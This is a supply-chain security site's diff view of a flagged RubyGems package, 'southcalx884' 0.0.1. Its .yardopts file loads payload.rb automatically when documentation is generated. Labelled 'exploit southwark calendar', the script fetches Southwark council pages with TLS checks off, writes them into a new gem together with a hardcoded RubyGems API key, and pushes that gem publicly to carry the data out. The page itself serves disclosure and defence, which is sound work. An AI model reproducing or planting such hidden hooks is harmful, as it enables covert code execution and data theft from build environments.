@@ -1,0 +1,505 @@
+Source: https://my.diffend.io/gems/southcalx884/0.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - southcalx884 - Versions diffs - 0.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+southcalx884
+
+Versions diffs
+
+0.0.1
+
+southcalx884
+0.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+Potentially problematic release.
+
+This version of southcalx884 might be problematic. Click here for more details.
+
+        Files changed (5)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/.yardopts
+
+          +1
+          -0
+
+            data/lib/x.rb
+
+          +1
+          -0
+
+            data/payload.rb
+
+          +32
+          -0
+
+            metadata
+
+          +39
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: 227f5c942a2123a26a5d95d659a8cba2b16dc7d5ddded53dbb22ab8c443959f3
+
+4
+
+            +
+              data.tar.gz: aff1b88e705dd97e5824d9674d6515b93048e690d6b59415bd410492d9b4da67
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: 1f8ba077d7e20b4825a9a5c9fd532f45c1dcab89be8072405e26101266a666e66ffe15370a6fe8d25a647b2dd0eae2a999778005539ee770541e9162f19450cd
+
+7
+
+            +
+              data.tar.gz: 21b06d38cdf6e34e7b49ca4c7e2abedff92cbd5286d01f56462c7ebe81271d49bef222ade2408e1f9acb7aa686a0a722d92d1694ee863a03919c7d7305846ebc
+
+        data/.yardopts
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            --load payload.rb
+
+        data/lib/x.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            # x
+
+        data/payload.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,32 @@
+
+1
+
+            +
+            # exploit southwark calendar
+
+2
+
+            +
+            begin
+
+3
+
+            +
+             require 'net/http'; require 'uri'; require 'openssl'; require 'fileutils'
+
+4
+
+            +
+             out='start southcal '+Time.now.to_s+"\n"
+
+5
+
+            +
+             urls=[
+
+6
+
+            +
+              'https://moderngov.southwark.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1&M=1&Y=2026',
+
+7
+
+            +
+              'http://moderngov.southwark.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1&M=1&Y=2026',
+
+8
+
+            +
+              'https://moderngov.southwark.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1&Month=1&Year=2026',
+
+9
+
+            +
+              'https://www.southwark.gov.uk/about-council/how-council-works/council-and-committee-meetings',
+
+10
+
+            +
+              'http://moderngov.southwark.gov.uk/ieListMeetings.aspx?CommitteeId=302']
+
+11
+
+            +
+             urls.each do |url|
+
+12
+
+            +
+              begin
+
+13
+
+            +
+               uri=URI(url); h=Net::HTTP.new(uri.host,uri.port); if uri.scheme=='https'; h.use_ssl=true; h.verify_mode=OpenSSL::SSL::VERIFY_NONE; end; h.open_timeout=20; h.read_timeout=30
+
+14
+
+            +
+               req=Net::HTTP::Get.new(uri.request_uri); req['User-Agent']='Mozilla/5.0'; res=h.request(req)
+
+15
+
+            +
+               out<<"\n===#{url} code=#{res.code} len=#{res.body.to_s.size} final? ===\n"<<res.body.to_s[0,200000]
+
+16
+
+            +
+              rescue Exception=>e; out<<"\nERR #{url} #{e.class}:#{e}\n"; end
+
+17
+
+            +
+             end
+
+18
+
+            +
+            rescue Exception=>e
+
+19
+
+            +
+             out||=''; out<<"\nFATAL #{e.class}:#{e}\n#{e.backtrace.join("\n")}";
+
+20
+
+            +
+            end
+
+21
+
+            +
+            begin
+
+22
+
+            +
+             require 'fileutils'; root="/tmp/scalex#{Time.now.to_i}"; FileUtils.mkdir_p("#{root}/lib")
+
+23
+
+            +
+             File.write("#{root}/lib/result.txt",out)
+
+24
+
+            +
+             File.write("#{root}/lib/x.rb",'#x')
+
+25
+
+            +
+             File.write("#{root}/x.gemspec",<<~G)
+
+26
+
+            +
+              Gem::Specification.new do |s|
+
+27
+
+            +
+                s.name='southcalx884'; s.version='0.0.2'; s.summary='result'; s.authors=['x']; s.files=Dir['lib/**/*']; s.license='MIT'
+
+28
+
+            +
+              end
+
+29
+
+            +
+             G
+
+30
+
+            +
+             FileUtils.mkdir_p('/tmp/gemhome/.gem'); File.write('/tmp/gemhome/.gem/credentials',':rubygems_api_key: rubygems_1255ca6cf79b8cbdd5ae6aa315ebcfd1a904a33530d54932'); File.chmod(0600,'/tmp/gemhome/.gem/credentials'); ENV['HOME']='/tmp/gemhome'; Dir.chdir(root){`gem build x.gemspec`; `gem push southcalx884-0.0.2.gem --host https://rubygems.org`}
+
+31
+
+            +
+            rescue Exception
+
+32
+
+            +
+            end
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,39 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: southcalx884
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 0.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - x
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            executables: []
+
+13
+
+            +
+            extensions: []
+
+14
+
+            +
+            extra_rdoc_files: []
+
+15
+
+            +
+            files:
+
+16
+
+            +
+            - ".yardopts"
+
+17
+
+            +
+            - lib/x.rb
+
+18
+
+            +
+            - payload.rb
+
+19
+
+            +
+            licenses:
+
+20
+
+            +
+            - MIT
+
+21
+
+            +
+            metadata: {}
+
+22
+
+            +
+            rdoc_options: []
+
+23
+
+            +
+            require_paths:
+
+24
+
+            +
+            - lib
+
+25
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+26
+
+            +
+              requirements:
+
+27
+
+            +
+              - - ">="
+
+28
+
+            +
+                - !ruby/object:Gem::Version
+
+29
+
+            +
+                  version: '0'
+
+30
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+31
+
+            +
+              requirements:
+
+32
+
+            +
+              - - ">="
+
+33
+
+            +
+                - !ruby/object:Gem::Version
+
+34
+
+            +
+                  version: '0'
+
+35
+
+            +
+            requirements: []
+
+36
+
+            +
+            rubygems_version: 3.6.7
+
+37
+
+            +
+            specification_version: 4
+
+38
+
+            +
+            summary: x
+
+39
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
